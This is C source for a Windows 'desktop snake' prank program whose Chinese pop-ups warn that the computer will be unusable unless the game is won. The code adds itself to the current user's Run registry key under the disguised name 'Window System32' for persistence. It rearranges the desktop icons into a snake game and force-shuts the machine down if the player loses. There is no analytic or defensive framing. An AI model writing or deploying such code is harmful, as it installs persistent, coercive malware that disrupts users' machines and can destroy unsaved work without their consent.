#include <windows.h>
#include <commctrl.h>
#include <time.h>
#define	Size 80
int		screenX, screenY, iCount, eatCount = 0;
HWND	DesktopHandle;
POINT	Position[500], FoodPosition, Vector;
int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE prehinstance, LPSTR lpCmdLine, int nShowCmd)
{
	char exepath[200];
	GetModuleFileName(NULL, exepath, sizeof(exepath));
	char path[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hkey;
	RegOpenKey(HKEY_CURRENT_USER, path, &hkey);
	RegSetValueEx(hkey, "Window System32", 0, REG_SZ, (unsigned char*)exepath, sizeof(exepath));
	srand(time(0));
	HWND hProgManager = FindWindowA("Progman", "Program Manager");
	HWND hShellDll = FindWindowExA(hProgManager, 0, "SHELLDLL_DefView", 0);
	DesktopHandle = FindWindowExA(hShellDll, 0, "SysListView32", 0);
	MessageBox(DesktopHandle, "请通关桌面贪吃蛇！否则您的电脑将无法使用！！！", " ", MB_ICONEXCLAMATION | MB_OK);
	MessageBox(DesktopHandle, "不要怪我没有提醒你，请准备好按上下左右键！！！", " ", MB_ICONEXCLAMATION | MB_OK);
	iCount = SendMessageA(DesktopHandle, LVM_GETITEMCOUNT, 0, 0);
	screenX = GetSystemMetrics(SM_CXSCREEN);
	screenY = GetSystemMetrics(SM_CYSCREEN);
	for (int i = 0; i < iCount; i++)
		SendMessageA(DesktopHandle, LVM_SETITEMPOSITION, i, (screenY << 16) + screenX);
	Position[0].x = rand() % (screenX / Size) * Size;
	Position[0].y = rand() % (screenY / Size) * Size;
	Sleep(100);
	FoodPosition.x = rand() % (screenX / Size) * Size;
	FoodPosition.y = rand() % (screenY / Size) * Size;
	SendMessageA(DesktopHandle, LVM_SETITEMPOSITION, 0, (Position[0].y << 16) + Position[0].x);
	SendMessageA(DesktopHandle, LVM_SETITEMPOSITION, 1, (FoodPosition.y << 16) + FoodPosition.x);
	Vector.x = 1, Vector.y = 0;
	while (true) {
		if (GetAsyncKeyState(VK_UP) != 0)Vector.x = 0, Vector.y = -1;
		if (GetAsyncKeyState(VK_LEFT) != 0)Vector.x = -1, Vector.y = 0;
		if (GetAsyncKeyState(VK_DOWN) != 0)Vector.x = 0, Vector.y = 1;
		if (GetAsyncKeyState(VK_RIGHT) != 0)Vector.x = 1, Vector.y = 0;
		for (int i = 0; i < eatCount + 1; i++)
			if (i == iCount)
				return -1;
			else if (eatCount - i == 0) {
				Position[0].x += Vector.x * Size;
				Position[0].y += Vector.y * Size;
				SendMessageA(DesktopHandle, LVM_SETITEMPOSITION, 0, (Position[0].y << 16) + Position[0].x);
			}
			else {
				Position[eatCount - i].x = Position[eatCount - i - 1].x;
				Position[eatCount - i].y = Position[eatCount - i - 1].y;
				SendMessageA(DesktopHandle, LVM_SETITEMPOSITION, eatCount - i, (Position[eatCount - i].y << 16) + Position[eatCount - i].x);
			}
		if (Position[0].x<0 || Position[0].x>screenX || Position[0].y<0 || Position[0].y>screenY) {
			system("shutdown -f -s -t 60");
			return -2;
		}
		if (Position[0].x == FoodPosition.x && Position[0].y == FoodPosition.y) {
			eatCount++;
			Position[eatCount].x = FoodPosition.x;
			Position[eatCount].y = FoodPosition.y;
			FoodPosition.x = rand() % (screenX / Size) * Size;
			FoodPosition.y = rand() % (screenY / Size) * Size;
			SendMessageA(DesktopHandle, LVM_SETITEMPOSITION, eatCount + 1, (FoodPosition.y << 16) + FoodPosition.x);
		}
		Sleep(200);
		if (eatCount == iCount - 1 || eatCount == 15) {
			MessageBox(DesktopHandle, "放过你了，祝你工作愉快！！", "  ", MB_OK);
			break;
		}
	}
	return 0;
}